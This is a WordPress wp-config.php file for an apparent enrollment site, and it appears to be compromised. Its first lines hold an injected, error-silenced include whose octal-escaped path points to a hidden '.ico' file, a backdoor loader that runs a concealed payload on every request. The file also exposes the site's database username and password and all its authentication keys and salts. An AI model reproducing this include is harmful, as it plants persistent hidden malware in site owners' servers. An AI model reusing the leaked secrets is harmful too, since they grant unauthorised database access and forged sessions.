<?php
/*83538*/

@include "\057home\057clix\1548k9/\160ubli\143_htm\154/tes\164/Pri\156tMat\057.1a5\143438b\056ico";

/*83538*/






/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'clixl8k9_enrollment' );

/** MySQL database username */
define( 'DB_USER', 'clixl8k9_store' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Adminclix?123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '/M,@,tfr{|G}6~7_^J~8}!n DO_kcg.kKv0CG?T%ScsLJ8FC|WTMmx3a8jsDiDaA' );
define( 'SECURE_AUTH_KEY',  ',#mBtxX]LM#~p(-:;3IE;FL5L@n{g/?A{Tl4r)_nGll/iEX5q=Ue`^?UA=Dc,6D|' );
define( 'LOGGED_IN_KEY',    's}[1iuh{ZO@5+k0ur5)MZ-m*^x1R6~fh.J)]Jfh-g%Uj9^VHW]?HO!U-veJ59Hk~' );
define( 'NONCE_KEY',        'UI=9OM0BU4qA&}4-!{6V1);3,MAdvA[~l^4A<qAk=sZj6#s/?B<Y-$g24Jv*1@~x' );
define( 'AUTH_SALT',        'S.,[w[cs&knRWSWh=.>u.:Cn+eY}8!2-Y*>a{2(RQ10fC96QhZx8]P!xN7yQo(_>' );
define( 'SECURE_AUTH_SALT', '1~hmg#rXu/w*T/$R]MUR>TrEK9SUaQ};@%cpt^45UAQ]lQ<{jfFySitBt05^fDl?' );
define( 'LOGGED_IN_SALT',   '3PR!v^#>wa$M?v%qw#vS)bEmgpG#YE>i`XIQ_k+bOc1?m~>vMTFh`U=|O_ba3j(&' );
define( 'NONCE_SALT',       'v=?%B|KBcl[tWtcqiq:%KT,}YBB=AR_ uO@81FVA-;Qcm9r$SJ0idIY +US~O+0L' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'enrollwp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
